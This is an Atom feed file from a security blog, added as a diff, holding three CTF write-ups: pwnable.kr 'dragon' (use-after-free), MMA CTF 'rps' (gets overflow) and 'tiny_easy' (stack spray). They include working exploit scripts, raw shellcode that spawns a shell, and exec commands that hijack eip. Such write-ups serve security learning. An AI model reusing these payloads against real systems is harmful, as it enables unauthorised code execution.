@@ -1,0 +1,261 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: ctf | Sheep Shellcode]]></title>
+  <link href="http://sheepshellcode.com/blog/categories/ctf/atom.xml" rel="self"/>
+  <link href="http://sheepshellcode.com/"/>
+  <updated>2016-04-12T20:58:40-04:00</updated>
+  <id>http://sheepshellcode.com/</id>
+  <author>
+    <name><![CDATA[Vincent Moscatello]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[How to Kill a Dragon]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/10/12/how-to-kill-a-dragon/"/>
+    <updated>2015-10-12T16:08:17-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/10/12/how-to-kill-a-dragon</id>
+    <content type="html"><![CDATA[<p><img class="center" src="/images/dragon/dragon.png" width="459" height="437"></p>
+
+<p>Dragon is a 75 point pwnable from pwnable.kr. That being said, if you are afraid of spoilers, DON’T continue! Try out the challenge for yourself! The binary is a 32 bit dynamically linked elf that still has most of its symbols left in tack. It takes a bit of reverse engineering to actually figure out how to exploit it though.</p>
+
+<p><img class="center" src="/images/dragon/welcome.png"></p>
+
+<p>You can start the challenge by connecting with netcat to pwnable.kr on port 9004. The premise of the challenge is pretty simple, your older brother has designed an RPG game that’s impossible to win. The objective? Kill the dragon, pwn the box, and get the flag.</p>
+
+<p>With ASLR and DEP enabled it was clear that this challenge was meant to be solved in a very particular way. After playing with the application for a bit, I loaded the binary into IDA.</p>
+
+<p><img class="center" src="/images/dragon/find-the-secret.png"></p>
+
+<p>The actual main function of the program was relatively uninteresting until it makes a call to the PlayGame function seen above. This is the same dialogue that asks you to select 1 if you would like to play as a knight and select 2 if you would like to play as a priest. The disassembly reveals a third option (3) that allows you to access a secret level!</p>
+
+<p><img class="center" src="/images/dragon/secretlevel.png"></p>
+
+<p>Unfortunately to actually access the secret level, you need a password and that password is not found anywhere in the binary. The only interesting part about the secret level is that it makes a call to system.</p>
+
+<p><img class="center" src="/images/dragon/victory.png"></p>
+
+<p>Assuming that at some point we find a vulnerability that gives us control of the instructional pointer, we should be able to jump directly to the address 0x08048DBF. This should work since the location of the text segment shouldn’t relocate because the application is compiled without PIE.</p>
+
+<p>So how do we actually kill this dragon? The answer lies in the data structures used to keep track of the dragon’s information. At the beginning of the PlayGame function, the game allocates memory for two structs on the heap.</p>
+
+<p><img class="center" src="/images/dragon/malloc.png"></p>
+
+<p>The first 16 byte struct is used to keep track of the player’s information. The values in this struct are determined by weather the player chose a knight class or a priest class. These two classes have different attacks and different amounts of health.</p>
+
+<p><img class="center" src="/images/dragon/priest-or-knight.png"></p>
+
+<p>The priest has a unique attack where he can use a magic shield to avoid taking any damage. This shield does have a certain amount of mana and needs to be recharged after a couple of uses.</p>
+
+<p>The second struct is a bit more interesting, it’s used to hold information about the dragon we are fighting.</p>
+
+<pre><code class="BASH">[ Mama Dragon ] 80 HP / 10 Damage / +4 Life Regeneration.
+[ Baby Dragon ] 50 HP / 30 Damage / +5 Life Regeneration.
+</code></pre>
+
+<p>There are two types of dragons a baby dragon and a mother dragon. The baby dragon has less health but deals more damage and has a greater life regeneration. The mama dragon has more health but a lower damage and lower life regeneration. The kind of dragon you get to fight is determined by a counter that alternates back and forth between baby dragon and mama dragon. This counter does not reset between rounds.</p>
+
+<p><img class="center" src="/images/dragon/mother-dragon.png"></p>
+
+<p>One thing you may have noticed in the picture above is that the dragon’s health is stored in a single byte at eax+8. This means that the dragon’s health can only be within the range of 0 to 127. A dragon is considered defeated when its health has turned 0.</p>
+
+<p>Since it’s mathematically impossible to kill the dragon by actually fighting it, the solution to killing the dragon is to not fight it at all! Specifically, to defeat the dragon we need to wait until the mama dragon regenerates enough health so that the mother dragon’s health overflows from 124 to 0.</p>
+
+<p>Fantastic! So now we know how to defeat the dragon! But how does defeating the dragon help us get a shell? Defeating the dragon causes a use after free condition which can be exploited to gain control of the instructional pointer.</p>
+
+<p><img class="center" src="/images/dragon/free.png"></p>
+
+<p>Normally, when the dragon wins, the dragon struct is first freed and the “I defeated a dragon condition” is returned as false, or zero, in the register eax. However if eax returns 1 like in the green box, the dragon struct is used later on in the code even though its already been freed.</p>
+
+<p><img class="center" src="/images/dragon/call-eax.png"></p>
+
+<p>In some cases a mistake like this might only cause a crash, in this case though we make a call to malloc again that is the same size as the dragon struct that we just freed. Due to the way binning works on linux, the new malloc should be allocated in the block we just freed. This new malloc is user controlled and is meant to store the player’s name. If we enter the player’s name as an address then the call eax, which used to have a function pointer, will actually point to wherever we want it to!</p>
+
+<p><img class="center" src="/images/dragon/use-after-free.png"></p>
+
+<p>Let’s use some clever python to point the instructional pointer back inside of the secret function and get a shell on the remote machine.</p>
+
+<pre><code class="PYTHON">import struct
+
+#kill ourselves 1 time to get to the mother dragon
+print "1"
+print "1"
+print "1"
+
+#Fight the dragon
+
+#choose priest
+print "1"
+
+#shield twice then regnerate we need to do this 4 times to trigger the one byte overflow
+
+for i in range(0,4):
+    print "3"
+    print "3"
+    print "2"
+
+#jump to the address of the secret level
+address = struct.pack("&lt;L",0x08048DBF)
+print address
+
+#feed commands to the shell
+print "cat flag"
+</code></pre>
+
+<p>Finally, lets enjoy the spoils of victory by piping the script through ncat! What can I say, it used to be a dragon once but then it took a use after free to the knee.</p>
+
+<p><img class="center" src="/images/dragon/winning.png"></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[MMA CTF: Rock Paper SHELLCODE]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/09/08/mma-ctf-rock-paper-shellcode/"/>
+    <updated>2015-09-08T14:32:30-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/09/08/mma-ctf-rock-paper-shellcode</id>
+    <content type="html"><![CDATA[<p>MMA CTF: Rock Paper SHELLCODE</p>
+
+<p>I had a really awesome time this weekend working on MMA CTF with the guys at ufsit.org ! Although the CTF lasted 48 hours, I was only able to put in 8 hours or so worth of time due to exams. I pretty much only went after pwnables, but checkout <a href="http://andrewjkerr.com/blog/mma-ctf-writeup/">http://andrewjkerr.com/blog/mma-ctf-writeup/</a> for an awesome web write-up from our secretary.</p>
+
+<p><img class="center" src="/images/rps/run-normal.png"></p>
+
+<p>The first challenge I solved was a 50 point pwnable called rps. The point of this challenge was to try and win 50 games of rock paper scissors against a remote service. They provided us with the binary for reverse engineering but not the text file that contains the flag.</p>
+
+<p>When you do the math it becomes very clear that brute forcing 50 games of rock paper scissors is not going to be feasible.  The probability of doing that successfully would be (1/3)<sup>50</sup>. Time to load the binary into IDA…</p>
+
+<p><img class="center" src="/images/rps/vulnerability.png"></p>
+
+<p>It was actually very easy to identify the vulnerability in this application. The program imports and makes a call to the vulnerable function gets. This results in an 80 byte stack based buffer overflow. The only part that gave me trouble was the actual exploitation.</p>
+
+<p>My first approach was to try and overwrite the saved rip and just point it to the victory condition found in the text segment (picture below).</p>
+
+<p><img class="center" src="/images/rps/victory.png"></p>
+
+<p>This was pretty easy to test out with about 5 lines of python.</p>
+
+<pre><code class="PYTHON">#!/usr/bin/python
+
+import struct
+
+rip = struct.pack("&lt;Q", 0x0000424242424242)
+rbp = struct.pack("&lt;Q", 0x4141414141414141)
+junk = "A"*80
+print junk+rbp+rip,
+</code></pre>
+
+<p><img class="center" src="/images/rps/overflow.png"></p>
+
+<p>After resolving some issues with canonical addressing, I was able to get control of rip. Unfortunately the location I was pointing rip into was not getting me the code execution I wanted. I actually have to go back and figure out why that was happening still. I came up with a different solution to the problem before spending more time on my old solution.</p>
+
+<p><img class="center" src="/images/rps/draw.png"></p>
+
+<p>Instead of overflowing rip I figured out that the seed which generated the choice of RPS was stored on the stack above where the user had to enter their name. Perfect! By overwriting the four bytes of entropy from /dev/random with AAAA it was possible to get the same sequence of rock paper scissors over and over again. From there we just shoved the solution through ncat.</p>
+
+<p><img class="center" src="/images/rps/pwned.png"></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[A Tiny Easy CTF Challenge]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/09/02/a-tiny-easy-ctf-challenge/"/>
+    <updated>2015-09-02T11:40:10-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/09/02/a-tiny-easy-ctf-challenge</id>
+    <content type="html"><![CDATA[<p>tiny_easy was a great example of how you can still put a large amount of complexity into a challenge that’s only 4 instructions. If you haven’t tried the challenge on your own make sure you check out at <a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a> . This write-up contains spoilers, consider yourself warned!</p>
+
+<p>The challenge starts by prompting you to ssh into a box running Ubuntu. I tried cat-ing /proc/sys/kernel/randomize_va_space and it looks like they left ASLR enabled. Excellent.</p>
+
+<pre><code class="BASH">ssh tiny_easy@pwnable.kr -p2222 (pw:guest)
+</code></pre>
+
+<p><img class="center" src="/images/tiny-easy/pwnablekr.png"></p>
+
+<p>Looks like the executable is a pretty standard pwnable. It’s a setuid binary where the objective is to call setuid and then spawn a shell so you can cat the flag.</p>
+
+<p>I decided that it would be easier to work with the executable locally so I scp-ed it onto my own hardware.</p>
+
+<p><img class="center" src="/images/tiny-easy/file.png"></p>
+
+<p>I started the analysis by running file on the executable. This actually yielded two important pieces of information. First, the executable is statically linked. Second, the executable has a corrupted section header size. Both of these will come into play later during exploitation.</p>
+
+<p><img class="center" src="/images/tiny-easy/objdump.png"></p>
+
+<p>This is where analyzing the executable starts to become more difficult. Running objdump on the executable didn’t dump any instructions! I am not entirely sure why this happened. My best guess is that since the executable didn’t contain a section header table, objdump just gave up on doing any disassembly.</p>
+
+<p>So it was time to be creative! I decided that the easiest way to get to the instructions would be to load executable into gdb and place a breakpoint on the executable’s entry point. I was able to get that entry point using readelf, which does a pretty reliable job of parsing through the elf header.</p>
+
+<p><img class="center" src="/images/tiny-easy/readelf.png"></p>
+
+<p>Some other interesting information we get from readelf is the fact that the program header and the elf header compose (32+52) = 84 out of the 90 bytes in the program. This means that there are only 6 bytes worth of executable instructions in the file.</p>
+
+<p><img class="center" src="/images/tiny-easy/break-on-entry.png"></p>
+
+<p>My gdb is slightly more colorful than the one most people are familiar with. Its actually gdb-peda you can check it out here: <a href="https://github.com/longld/peda">https://github.com/longld/peda</a> “Python Exploit Development Assistance for GDB” makes exploitation significantly easier.</p>
+
+<p>tiny_easy doesn’t even bother trying to create a stack frame. Instead it pops argc into eax, pops a char pointer (argv[0]) into edx, dereferences that pointer/stores its contents into edx, and then finally it calls edx. When we type c and tell the program to continue, it does exactly what we expect it to: segfault. Let’s take a look at the registers at the time of the crash.</p>
+
+<p><img class="center" src="/images/tiny-easy/content-of-edx.png"></p>
+
+<p>Once again nothing surprising here. The program crashes at the first 4 ascii characters of argv[0]. After quite a bit of googling it turns out that the built in command exec in bash lets you modify the value of argv when executing.</p>
+
+<p><img class="center" src="/images/tiny-easy/exec.png"></p>
+
+<p>By opening up the core dump in gdb we can see that we got it to crash to 0x42424242 W00t!</p>
+
+<p><img class="center" src="/images/tiny-easy/crash.png"></p>
+
+<p>But we are not quite done yet. Actually we are far from done! Now that we control the value of eip where should we tell it to go?</p>
+
+<p>ASLR makes this tricky and we can’t really use return oriented programing since our 6 byte program doesn’t call any functions. Since the program is statically compiled we don’t even have any dynamic libraries/a GOT we can poke around with.</p>
+
+<p>I decided to depend on an extremely messy technique influenced by some old write-ups I’ve read for IE6. Quite a few IE6 exploits use “heap spraying” to get code execution.</p>
+
+<pre><code class="BASH">[NOPS * 4096]
+[ SHELLCODE ]
+[NOPS * 4096]
+[ SHELLCODE ]
+[NOPS * 4096]
+[ SHELLCODE ]
+</code></pre>
+
+<p>The idea here is you fill the heap with NOPS followed by shellcode and hope you land somewhere in the middle of one of the sleds so you can slide into your shellcode.</p>
+
+<p>We are going to apply the same technique here but instead of spraying the heap we are going to spray the stack. I decided to use environmental variables to do the spraying.</p>
+
+<pre><code class="BASH">|-------EXPLOIT-------|
+for i in `seq 1 100`; 
+do 
+export A_$i=$(python -c 'print "\x90"*4096 + "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"'); 
+done
+</code></pre>
+
+<p>It took two tries before I was able to get successful code execution.</p>
+
+<pre><code class="BASH">|-------FAIL-------|
+tiny_easy@ubuntu:~$ exec -a $(python -c 'print "\x90\xd5\x9c\xff"') ./tiny_easy &amp;
+[1] 12576
+tiny_easy@ubuntu:~$ fg
+-bash: fg: job has terminated
+[1]+  Segmentation fault      exec -a $(python -c 'print "\x90\xd5\x9c\xff"') ./tiny_easy
+</code></pre>
+
+<pre><code class="BASH">|-------SUCCESS-------|
+tiny_easy@ubuntu:~$ exec -a $(python -c 'print "\x90\xd5\x9c\xff"') ./tiny_easy &amp;
+[1] 12579
+tiny_easy@ubuntu:~$ fg
+exec -a $(python -c 'print "\x90\xd5\x9c\xff"') ./tiny_easy
+$ whoami
+tiny_easy
+</code></pre>
+
+<p>Success! Time to claim the spoils of victory</p>
+
+<pre><code class="BASH">$ cat flag
+What a tiny task :) good job!
+</code></pre>
+]]></content>
+  </entry>
+  
+</feed>
